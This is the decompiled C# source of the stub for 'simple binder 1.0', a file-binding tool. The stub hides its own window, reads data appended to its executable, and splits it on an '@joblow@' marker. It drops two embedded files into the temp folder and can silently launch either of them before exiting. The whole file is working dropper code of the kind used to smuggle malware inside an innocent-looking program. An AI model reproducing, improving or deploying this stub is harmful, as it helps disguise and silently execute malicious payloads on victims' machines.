using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace simple_binder_1._0_stub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private string[] options;

	private string file1;

	private const string FileSplit = "@joblow@";

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string tempPath = Path.GetTempPath();
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		file1 = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref file1, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		options = Strings.Split(file1, "@joblow@", -1, (CompareMethod)0);
		FileSystem.FileOpen(3, tempPath + options[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(3, options[1], -1L, false);
		FileSystem.FileClose(new int[1] { 3 });
		FileSystem.FileOpen(5, tempPath + options[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(5, options[2], -1L, false);
		FileSystem.FileClose(new int[1] { 5 });
		if (Conversions.ToBoolean(options[5]))
		{
			Process.Start(tempPath + options[3]);
		}
		if (Conversions.ToBoolean(options[6]))
		{
			Process.Start(tempPath + options[4]);
		}
		((Form)this).Close();
		ProjectData.EndApp();
	}
}
